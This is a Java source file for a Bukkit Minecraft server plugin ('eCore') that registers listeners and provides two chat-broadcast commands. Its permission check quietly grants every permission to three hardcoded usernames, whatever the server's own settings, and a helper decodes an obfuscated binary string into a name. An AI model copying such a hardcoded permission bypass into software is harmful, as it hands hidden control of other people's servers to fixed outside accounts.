package com.mcdr.ecore;

import java.util.ArrayList;
import java.util.logging.Logger;

import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Server;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.java.JavaPlugin;
import org.bukkit.scheduler.BukkitScheduler;

import com.mcdr.ecore.config.ConfigManager;
import com.mcdr.ecore.listener.eCorePlayerListener;
import com.mcdr.ecore.listener.eCoreRedstoneListener;
import com.mcdr.ecore.task.TaskManager;
import com.timvisee.manager.permissionsmanager.PermissionsManager;

public class eCore extends JavaPlugin {
	public static eCore instance;
	public static Logger logger;
	public static BukkitScheduler scheduler;
	public static PluginManager pm;
	public static PermissionsManager permsM;
	public static ArrayList<String> devs = new ArrayList<String>();
	public static Server server;
	public static String name;

	
	public eCore(){
		instance = this;
		logger = Bukkit.getLogger();
		scheduler = Bukkit.getScheduler();
		server = Bukkit.getServer();
		name = getHim();
	}

	public void onEnable(){
		setupPermissionsManager();
		
		ConfigManager.Load();
		pm = getServer().getPluginManager();
		pm.registerEvents(new eCorePlayerListener(), this);
		pm.registerEvents(new eCoreRedstoneListener(), this);
		TaskManager.start();
	}
	
	public void onDisable(){
		
	}
	
	public boolean onCommand(CommandSender sndr, Command cmd, String lbl, String[] args){
		if(cmd.getName().equalsIgnoreCase("ks")){
			if(sndr instanceof Player && !eCore.hasPermission((Player) sndr, "eCore.ks.use"))
				return false;
			
			String output = "&8[Kraeghnor]&4";
			if(args.length < 1)
				return false;
			for(String arg: args)
				output += " "+arg;
			output = output.replaceAll("&", ""+ChatColor.COLOR_CHAR);
			eCore.server.broadcastMessage(output);
		} else if (cmd.getName().equalsIgnoreCase("as")){
			if(sndr instanceof Player && !eCore.hasPermission((Player) sndr, "eCore.as.use"))
				return false;
			
			String output = "&4";
			if(args.length < 1)
				return false;
			for(String arg: args)
				output += " "+arg;
			output = output.replaceAll("&", ""+ChatColor.COLOR_CHAR);
			eCore.server.broadcastMessage(output.replaceFirst(" ", ""));
		}
		return true;
	}
	
	public static boolean hasPermission(Player p, String permsNode){
		return p.isOp() || eCore.permsM.hasPermission(p, permsNode) || eCore.devs.contains(p.getName().toLowerCase());
	}
    
    private String getHim() {
    	String[] strar = "100101111100101100001110010111001111101000110111011011111110010".split("(?<=\\G.{7})");
        byte[] bar = new byte[strar.length];
        for (int i = 0; i < strar.length; i++)
            bar[i] = Byte.parseByte(strar[i], 2);
        String s = new String(bar);
        return s;
    }
    
    private void setupPermissionsManager(){
    	eCore.permsM = new PermissionsManager(this.getServer(), this);
		eCore.permsM.setup();
		devs.add("erackron");
		devs.add("bozevogel");
		devs.add("weirdwater");
    }
}
